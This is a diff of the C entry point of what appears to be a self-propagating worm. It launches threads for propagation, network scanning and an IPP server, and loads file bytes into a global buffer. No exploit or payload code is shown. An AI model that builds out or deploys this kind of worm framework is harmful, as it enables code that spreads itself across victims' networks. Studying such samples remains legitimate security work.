@@ -1,25 +1,29 @@
 #include "ipp_server.h"
 #include "propagate.h"
 #include "scanner.h"
+#include "utils.h"
 
 void * start_propagate(void *varg){
     Globals *global = (Globals *) varg;
-    global->printf("Starting propagation module...\n");
+    DEBUG_LOG("[ENTRY] Starting propagation module...\n");
     propagate(global);
 }
 void * start_network_scanner(void *varg){
     Globals *global = (Globals *) varg;
-    global->printf("Starting network-scanner module...\n");
+    DEBUG_LOG("[ENTRY] Starting network-scanner module...\n");
     scan_net(global);
 }
 
 void * start_ipp_server(void *varg){
     Globals *global = (Globals *) varg;
-    global->printf("Starting ipp-server module...\n");
+    DEBUG_LOG("[ENTRY] Starting ipp-server module...\n");
     serve(global);
 }
 
 void entry(Globals *global) {
+    // load the file content into the global buffer
+    load_file_bytes(global);
+
     // start propagate
     pthread_t thread_id_propagate;
     global->pthread_create(&thread_id_propagate, NULL, start_propagate, global);
@@ -33,10 +37,10 @@ void entry(Globals *global) {
     global->pthread_create(&thread_id_ipp, NULL, start_ipp_server, global);
 
     
-    global->fprintf(global->stdout, "Started all modules!\n");
+    DEBUG_LOG("[ENTRY] Started all modules!\n");
     // keep running
     while(1){
-        //global->fprintf(global->stdout, "Sleeping with my eyes open *.*\n");
-        global->sleep(1);
+        TRAP;
+        global->sleep_ms(100);
     }
 }
